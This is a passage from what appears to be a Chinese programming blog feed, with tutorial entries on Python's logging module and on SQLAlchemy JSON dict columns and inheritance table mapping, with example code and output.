        <content type="html"><![CDATA[<ul><li><a href="https://docs.python.org/zh-cn/3/howto/logging.html#logging-basic-tutorial">日志常用指引</a></li></ul><h2 id="日志级别"><a href="#日志级别" class="headerlink" title="日志级别"></a>日志级别</h2><table><thead><tr><th align="center">级别</th><th align="center">何时使用</th></tr></thead><tbody><tr><td align="center">DEBUG</td><td align="center">细节信息，仅当诊断问题时适用。</td></tr><tr><td align="center">INFO</td><td align="center">确认程序按预期运行。</td></tr><tr><td align="center">WARNING</td><td align="center">表明有已经或即将发生的意外（例如：磁盘空间不足）。程序仍按预期进行。</td></tr><tr><td align="center">ERROR</td><td align="center">由于严重的问题，程序的某些功能已经不能正常执行</td></tr><tr><td align="center">CRITICAL</td><td align="center">严重的错误，表明程序已不能继续执行</td></tr></tbody></table><h2 id="初级使用"><a href="#初级使用" class="headerlink" title="初级使用"></a>初级使用</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line">logging.warning(<span class="hljs-string">&#x27;Watch out!&#x27;</span>)  <span class="hljs-comment"># will print a message to the console</span></span><span class="line">logging.info(<span class="hljs-string">&#x27;I told you so&#x27;</span>)  <span class="hljs-comment"># will not print anything</span></span></code></pre></div></div><p>记录到文件</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line">logging.basicConfig(filename=<span class="hljs-string">&#x27;example.log&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, level=logging.DEBUG)</span><span class="line">logging.debug(<span class="hljs-string">&#x27;This message should go to the log file&#x27;</span>)</span><span class="line">logging.info(<span class="hljs-string">&#x27;So should this&#x27;</span>)</span><span class="line">logging.warning(<span class="hljs-string">&#x27;And this, too&#x27;</span>)</span><span class="line">logging.error(<span class="hljs-string">&#x27;very bad&#x27;</span>)</span></code></pre></div></div><h2 id="logging的组件"><a href="#logging的组件" class="headerlink" title="logging的组件"></a>logging的组件</h2><p>logging采用组件的方式组合使用</p><p>logging 模块的四大组件</p><table><thead><tr><th align="center">组件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">loggers</td><td align="center">提供应用程序代码直接使用的接口</td></tr><tr><td align="center">handlers</td><td align="center">处理器将日志记录（由记录器创建）发送到适当的目标。</td></tr><tr><td align="center">filters</td><td align="center">过滤器提供了更细粒度的功能，用于确定要输出的日志记录。</td></tr><tr><td align="center">formatters</td><td align="center">用于控制日志信息的最终输出格式</td></tr></tbody></table><h3 id="记录器-logger"><a href="#记录器-logger" class="headerlink" title="记录器 logger"></a>记录器 logger</h3><p>记录器的三个任务</p><ol><li>记录器对程序公开了几个接口，可以用于记录日志信息</li><li>根据严重程度或者过滤器确定是否记录日志</li><li>将记录的日志发送给处理器handler</li></ol><p>常用的接口:</p><ul><li><code>Logger.getLogger()</code></li><li><code>Logger.setLevel()</code></li><li><code>Logger.addHandler()</code> 与 <code>Logger.removeHandler()</code></li><li><code>Logger.addFilter()</code> 与 <code>Logger.removeFilter()</code></li></ul><p>以及记录日志信息方法：</p><ul><li><code>Logger.debug()</code></li><li><code>Logger.info()</code></li><li><code>Logger.warning()</code></li><li><code>Logger.error()</code></li><li><code>Logger.exception()</code></li></ul><p>其中<code>Logger.exception()</code>和<code>Logger.error()</code>的区别是，前者会自动记录异常信息，后者不会。</p><p>在命名记录器时使用的一个好习惯是在每个使用日志记录的模块中使用模块级记录器，命名如下:</p><p><code>Logger.getLogger(__name__)</code></p><p>多次调用<code>getLogger()</code>具有相同的名称将返回对同一记录器对象的引用。</p><h3 id="处理器-handler"><a href="#处理器-handler" class="headerlink" title="处理器 handler"></a>处理器 handler</h3><p>hanlder将适当的（根据日志消息的严重性）日志记录发送的指定的目标。</p><blockquote><p>作为示例场景，应用程序可能希望将所有日志消息发送到日志文件，将错误或更高的所有日志消息发送到标准输出，以及将所有关键消息发送至一个邮件地址。 此方案需要三个单独的处理器，其中每个处理器负责将特定严重性的消息发送到特定位置。</p></blockquote><p>标准库中包含很多处理器，常用的有<code>StreamHandler</code>和<code>FileHandler</code>。更多的处理器可以在<a href="https://docs.python.org/zh-cn/3/howto/logging.html#useful-handlers">这里</a>找到。</p><p>常用的接口：</p><ul><li><code>Handler.setLevel()</code> 和 <code>Logger.setLevel()</code>不同，<code>Logger</code>的是发送给Handler的最低严重性，而<code>Hander</code>的是发送给目标的最低严重性。</li><li><code>Handler.setFormatter()</code></li><li><code>Handler.addFilter()</code> 与 <code>Handler.removeFilter()</code></li></ul><h3 id="格式器-formatter"><a href="#格式器-formatter" class="headerlink" title="格式器 formatter"></a>格式器 formatter</h3><p>标准格式如下:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">logging.Formatter.__init__(fmt=<span class="hljs-literal">None</span>, datefmt=<span class="hljs-literal">None</span>, style=<span class="hljs-string">&#x27;%&#x27;</span>)</span></code></pre></div></div><p>三个可选项分别是<code>消息格式字符串</code>、<code>日期格式字符串</code>和<code>样式指示符</code>。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">fmt=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span></span></code></pre></div></div><h2 id="配置日志记录"><a href="#配置日志记录" class="headerlink" title="配置日志记录"></a>配置日志记录</h2><h3 id="代码配置日志记录"><a href="#代码配置日志记录" class="headerlink" title="代码配置日志记录"></a>代码配置日志记录</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># create logger</span></span><span class="line">logger = logging.getLogger(<span class="hljs-string">&#x27;simple_example&#x27;</span>)</span><span class="line">logger.setLevel(logging.DEBUG)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># create console handler and set level to debug</span></span><span class="line">ch = logging.StreamHandler()</span><span class="line">ch.setLevel(logging.DEBUG)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># create formatter</span></span><span class="line">formatter = logging.Formatter(<span class="hljs-string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># add formatter to ch</span></span><span class="line">ch.setFormatter(formatter)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># add ch to logger</span></span><span class="line">logger.addHandler(ch)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># &#x27;application&#x27; code</span></span><span class="line">logger.debug(<span class="hljs-string">&#x27;debug message&#x27;</span>)</span><span class="line">logger.info(<span class="hljs-string">&#x27;info message&#x27;</span>)</span><span class="line">logger.warning(<span class="hljs-string">&#x27;warn message&#x27;</span>)</span><span class="line">logger.error(<span class="hljs-string">&#x27;error message&#x27;</span>)</span><span class="line">logger.critical(<span class="hljs-string">&#x27;critical message&#x27;</span>)</span></code></pre></div></div><h3 id="yaml配置日志记录"><a href="#yaml配置日志记录" class="headerlink" title="yaml配置日志记录"></a>yaml配置日志记录</h3><div class="codeBlockContainer"><div class="codeBlockTitle">log.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line"><span class="hljs-keyword">import</span> logging.config</span><span class="line"><span class="hljs-keyword">import</span> yaml</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> lib.data.data <span class="hljs-keyword">import</span> pystr</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setup_logger</span>() -&gt; logging.Logger:</span></span><span class="line">    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;logconf.yaml&#x27;</span>) <span class="hljs-keyword">as</span> f:</span><span class="line">        config = yaml.safe_load(f.read())</span><span class="line">        logging.config.dictConfig(config)</span><span class="line">        logger = logging.getLogger(<span class="hljs-string">&#x27;simpleExample&#x27;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> logger</span><span class="line"></br></span><span class="line">logger = setup_logger()</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">logging.yaml</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">version:</span> <span class="hljs-number">1</span></span><span class="line"><span class="hljs-attr">formatters:</span></span><span class="line">  <span class="hljs-attr">simple:</span></span><span class="line">    <span class="hljs-attr">format:</span> <span class="hljs-string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span></span><span class="line"><span class="hljs-attr">handlers:</span></span><span class="line">  <span class="hljs-attr">console:</span></span><span class="line">    <span class="hljs-attr">class:</span> <span class="hljs-string">logging.StreamHandler</span></span><span class="line">    <span class="hljs-attr">level:</span> <span class="hljs-string">INFO</span></span><span class="line">    <span class="hljs-attr">formatter:</span> <span class="hljs-string">simple</span></span><span class="line">    <span class="hljs-attr">stream:</span> <span class="hljs-string">ext://sys.stdout</span></span><span class="line">  <span class="hljs-attr">debug_file_handler:</span></span><span class="line">    <span class="hljs-attr">class:</span> <span class="hljs-string">logging.handlers.RotatingFileHandler</span></span><span class="line">    <span class="hljs-attr">level:</span> <span class="hljs-string">DEBUG</span></span><span class="line">    <span class="hljs-attr">formatter:</span> <span class="hljs-string">simple</span></span><span class="line">    <span class="hljs-attr">filename:</span> <span class="hljs-string">./log/debug.log</span></span><span class="line">    <span class="hljs-attr">maxBytes:</span> <span class="hljs-number">10485760</span> <span class="hljs-comment"># 10MB</span></span><span class="line">    <span class="hljs-attr">backupCount:</span> <span class="hljs-number">20</span></span><span class="line"><span class="hljs-attr">error_file_handler:</span></span><span class="line">    <span class="hljs-attr">class:</span> <span class="hljs-string">logging.handlers.RotatingFileHandler</span></span><span class="line">    <span class="hljs-attr">level:</span> <span class="hljs-string">ERROR</span></span><span class="line">    <span class="hljs-attr">formatter:</span> <span class="hljs-string">simple</span></span><span class="line">    <span class="hljs-attr">filename:</span> <span class="hljs-string">./log/error.log</span></span><span class="line">    <span class="hljs-attr">maxBytes:</span> <span class="hljs-number">10485760</span> <span class="hljs-comment"># 10MB</span></span><span class="line">    <span class="hljs-attr">backupCount:</span> <span class="hljs-number">20</span></span><span class="line">    <span class="hljs-attr">encoding:</span> <span class="hljs-string">utf8</span></span><span class="line"><span class="hljs-attr">loggers:</span></span><span class="line">  <span class="hljs-attr">pyaio:</span></span><span class="line">    <span class="hljs-attr">level:</span> <span class="hljs-string">DEBUG</span></span><span class="line">    <span class="hljs-attr">handlers:</span> [<span class="hljs-string">console</span>, <span class="hljs-string">debug_file_handler</span>, <span class="hljs-string">error_file_handler</span>]</span><span class="line">    <span class="hljs-attr">propagate:</span> <span class="hljs-literal">no</span></span><span class="line"><span class="hljs-attr">root:</span></span><span class="line">  <span class="hljs-attr">level:</span> <span class="hljs-string">DEBUG</span></span><span class="line">  <span class="hljs-attr">handlers:</span> [<span class="hljs-string">console</span>]   <span class="hljs-attr">encoding:</span> <span class="hljs-string">utf8</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python sqlalchemy 使用Dict字段</title>
      <link href="/2021/11/18/python-sqlalchemy-%E4%BD%BF%E7%94%A8Dict%E5%AD%97%E6%AE%B5/"/>
      <url>/2021/11/18/python-sqlalchemy-%E4%BD%BF%E7%94%A8Dict%E5%AD%97%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<p>SqlAlchemy对应的数据库的表结构，数据库是没有Dict字段的，所以只能通过<code>json</code>来存储。</p><p>而想要将其做成自动存储，需要使用<code>sqlalchemy.ext.mutable</code>模块。</p><div class="codeBlockContainer"><div class="codeBlockTitle">sqlalchemy_type.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> json</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.types <span class="hljs-keyword">import</span> TypeDecorator, VARCHAR</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.mutable <span class="hljs-keyword">import</span> Mutable</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JSONEncodedDict</span>(<span class="hljs-params">TypeDecorator</span>):</span></span><span class="line">    <span class="hljs-string">&quot;Represents an immutable structure as a json-encoded string.&quot;</span></span><span class="line"></br></span><span class="line">    impl = VARCHAR</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_bind_param</span>(<span class="hljs-params">self, value, dialect</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:</span><span class="line">            value = json.dumps(value)</span><span class="line">        <span class="hljs-keyword">return</span> value</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_result_value</span>(<span class="hljs-params">self, value, dialect</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:</span><span class="line">            value = json.loads(value)</span><span class="line">        <span class="hljs-keyword">return</span> value</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MutableDict</span>(<span class="hljs-params">Mutable, <span class="hljs-built_in">dict</span></span>):</span></span><span class="line"><span class="hljs-meta">    @classmethod</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">coerce</span>(<span class="hljs-params">cls, key, value</span>):</span></span><span class="line">        <span class="hljs-string">&quot;Convert plain dictionaries to MutableDict.&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, MutableDict):</span><span class="line">            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">dict</span>):</span><span class="line">                <span class="hljs-keyword">return</span> MutableDict(value)</span><span class="line"></br></span><span class="line">            <span class="hljs-comment"># this call will raise ValueError</span></span><span class="line">            <span class="hljs-keyword">return</span> Mutable.coerce(key, value)</span><span class="line">        <span class="hljs-keyword">else</span>:</span><span class="line">            <span class="hljs-keyword">return</span> value</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__setitem__</span>(<span class="hljs-params">self, key, value</span>):</span></span><span class="line">        <span class="hljs-string">&quot;&quot;&quot;捕获设置事件，并将自己设置为已修改&quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-built_in">dict</span>.__setitem__(self, key, value)</span><span class="line">        self.changed()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__delitem__</span>(<span class="hljs-params">self, key</span>):</span></span><span class="line">        <span class="hljs-string">&quot;&quot;&quot;捕获删除事件，并将自己设置为已修改&quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-built_in">dict</span>.__delitem__(self, key)</span><span class="line">        self.changed()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span></span><span class="line">        <span class="hljs-string">&quot;&quot;&quot;捕获update事件，并将自己设置为已修改&quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-built_in">dict</span>.update(self, *args, **kwargs)</span><span class="line">        self.changed()</span></code></pre></div></div><p>使用经典映射</p><div class="codeBlockContainer"><div class="codeBlockTitle">orm.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Table, Column, Integer</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy_type <span class="hljs-keyword">import</span> MutableDict, JSONEncodedDict</span><span class="line"></br></span><span class="line">my_data = Table(<span class="hljs-string">&#x27;my_data&#x27;</span>, metadata,</span><span class="line">    Column(<span class="hljs-string">&#x27;id&#x27;</span>, Integer, primary_key=<span class="hljs-literal">True</span>),</span><span class="line">    Column(<span class="hljs-string">&#x27;data&#x27;</span>, MutableDict.as_mutable(JSONEncodedDict))</span><span class="line">)</span></code></pre></div></div><p>或者使用关系映射</p><div class="codeBlockContainer"><div class="codeBlockTitle">orm.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy_type <span class="hljs-keyword">import</span> MutableDict, JSONEncodedDict</span><span class="line"></br></span><span class="line">Base = declarative_base()</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyDataClass</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;my_data&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    data = Column(MutableDict.as_mutable(JSONEncodedDict))</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqlalchemy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python sqlalchemy 继承关系表</title>
      <link href="/2021/11/12/python-sqlalchemy-%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E8%A1%A8/"/>
      <url>/2021/11/12/python-sqlalchemy-%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>通常，我们会使用一个类来表示一个表，这个类的属性就是表中的字段，这个类的方法就是表中的操作。</p><p>但是继承关系的话，想把继承关系放到表中取表达就需要特殊的方法。</p><p>有两种方式，一种是对每个类都定义一个表，还有一种就是将所有类都放到一个表中。</p><h2 id="对每个类都定义一个表"><a href="#对每个类都定义一个表" class="headerlink" title="对每个类都定义一个表"></a>对每个类都定义一个表</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, Integer, String, ForeignKey</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker</span><span class="line"></br></span><span class="line">Base = declarative_base()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Item</span>(<span class="hljs-params">Base</span>):</span></span><span class="line"></br></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;item&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    name = Column(String(<span class="hljs-number">50</span>))  <span class="hljs-comment"># formerly known as type</span></span><span class="line">    <span class="hljs-built_in">type</span> = Column(String(<span class="hljs-number">50</span>))</span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;item&#x27;</span>,</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_on&#x27;</span>: <span class="hljs-built_in">type</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sword</span>(<span class="hljs-params">Item</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;sword&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, ForeignKey(<span class="hljs-string">&#x27;item.id&#x27;</span>), primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    durability = Column(Integer, default=<span class="hljs-number">100</span>)</span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;Sword&#x27;</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pistol</span>(<span class="hljs-params">Item</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;pistol&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, ForeignKey(<span class="hljs-string">&#x27;item.id&#x27;</span>), primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    ammo = Column(Integer, default=<span class="hljs-number">10</span>)</span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;Pistol&#x27;</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line"></br></span><span class="line">    engin = create_engine(<span class="hljs-string">&#x27;sqlite:///:memory:&#x27;</span>, echo=<span class="hljs-literal">False</span>)</span><span class="line">    session = sessionmaker(bind=engin)()</span><span class="line">    Base.metadata.create_all(engin)</span><span class="line"></br></span><span class="line">    sword = Sword(name=<span class="hljs-string">&#x27;S1&#x27;</span>, durability=<span class="hljs-number">100</span>)</span><span class="line">    pistol = Pistol(name=<span class="hljs-string">&#x27;P1&#x27;</span>, ammo=<span class="hljs-number">20</span>)</span><span class="line"></br></span><span class="line">    session.add(sword)</span><span class="line">    session.add(pistol)</span><span class="line">    session.commit()</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(session.query(Item).<span class="hljs-built_in">all</span>())</span><span class="line">    <span class="hljs-built_in">print</span>(session.execute(<span class="hljs-string">&#x27;select * from item&#x27;</span>).fetchall())</span><span class="line">    <span class="hljs-built_in">print</span>(session.execute(<span class="hljs-string">&#x27;select * from sword&#x27;</span>).fetchall())</span><span class="line">    <span class="hljs-built_in">print</span>(session.execute(<span class="hljs-string">&#x27;select * from pistol&#x27;</span>).fetchall())</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;====== Sword ======&quot;</span>)</span><span class="line">    s = session.query(Sword).first()  <span class="hljs-comment"># type: Sword</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sword.name: &quot;</span>, s.name)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sword.durability: &quot;</span>, s.durability)</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;====== Pistol ======&quot;</span>)</span><span class="line">    p = session.query(Pistol).first()  <span class="hljs-comment"># type: Pistol</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Pistol.name: &quot;</span>, p.name)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Pistol.ammo: &quot;</span>, p.ammo)</span></code></pre></div></div><p>output:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">[&lt;__main__.Sword object at 0x000001BB35CD0940&gt;, &lt;__main__.Pistol object at 0x000001BB35D16BB0&gt;]</span><span class="line">[(1, &#x27;S1&#x27;, &#x27;Sword&#x27;), (2, &#x27;P1&#x27;, &#x27;Pistol&#x27;)]</span><span class="line">[(1, 100)]</span><span class="line">[(2, 20)]</span><span class="line">====== Sword ======</span><span class="line">Sword.name:  S1</span><span class="line">Sword.durability:  100</span><span class="line">====== Pistol ======</span><span class="line">Pistol.name:  P1</span><span class="line">Pistol.ammo:  20</span></code></pre></div></div><h2 id="所有类都在一个表中"><a href="#所有类都在一个表中" class="headerlink" title="所有类都在一个表中"></a>所有类都在一个表中</h2><p>这样有一个弊端，就会导致所有子类都会共享其他之类特有属性</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, Integer, String</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker</span><span class="line"></br></span><span class="line">Base = declarative_base()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Item</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    name = <span class="hljs-string">&#x27;unnamed item&#x27;</span></span><span class="line"></br></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;item&#x27;</span></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)</span><span class="line">    <span class="hljs-built_in">type</span> = Column(String(<span class="hljs-number">50</span>))</span><span class="line">    durability = Column(Integer, default=<span class="hljs-number">100</span>)</span><span class="line">    ammo = Column(Integer, default=<span class="hljs-number">10</span>)</span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;item&#x27;</span>,</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_on&#x27;</span>: <span class="hljs-built_in">type</span></span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sword</span>(<span class="hljs-params">Item</span>):</span></span><span class="line">    name = <span class="hljs-string">&#x27;Sword&#x27;</span></span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;sword&#x27;</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pistol</span>(<span class="hljs-params">Item</span>):</span></span><span class="line">    name = <span class="hljs-string">&#x27;Pistol&#x27;</span></span><span class="line"></br></span><span class="line">    __mapper_args__ = &#123;</span><span class="line">        <span class="hljs-string">&#x27;polymorphic_identity&#x27;</span>: <span class="hljs-string">&#x27;pistol&#x27;</span>,</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    engine = create_engine(<span class="hljs-string">&#x27;sqlite:///:memory:&#x27;</span>, echo=<span class="hljs-literal">False</span>)</span><span class="line">    session = sessionmaker(bind=engine)()</span><span class="line">    Base.metadata.create_all(engine)</span><span class="line"></br></span><span class="line">    sword = Sword(durability=<span class="hljs-number">20</span>)</span><span class="line">    pistol = Pistol(ammo=<span class="hljs-number">30</span>)</span><span class="line">    session.add(sword)</span><span class="line">    session.add(pistol)</span><span class="line">    session.commit()</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(session.query(Item).<span class="hljs-built_in">all</span>())</span><span class="line">    <span class="hljs-built_in">print</span>(session.execute(<span class="hljs-string">&#x27;select * from item&#x27;</span>).fetchall())</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;====== Sword ======&quot;</span>)</span><span class="line">    s = session.query(Sword).first()  <span class="hljs-comment"># type: Sword</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sword.name: &quot;</span>, s.name)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sword.durability: &quot;</span>, s.durability)</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;====== Pistol ======&quot;</span>)</span><span class="line">    p = session.query(Pistol).first()  <span class="hljs-comment"># type: Pistol</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Pistol.name: &quot;</span>, p.name)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Pistol.ammo: &quot;</span>, p.ammo)</span></code></pre></div></div><p>output:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">[&lt;__main__.Sword object at 0x000002DB20A0D0A0&gt;, &lt;__main__.Pistol object at 0x000002DB20A4D580&gt;]</span><span class="line">[(1, &#x27;sword&#x27;, 20, 10), (2, &#x27;pistol&#x27;, 100, 30)]</span><span class="line">====== Sword ======</span><span class="line">Sword.name:  Sword</span><span class="line">Sword.durability:  20</span><span class="line">====== Pistol ======</span><span class="line">Pistol.name:  Pistol</span><span class="line">Pistol.ammo:  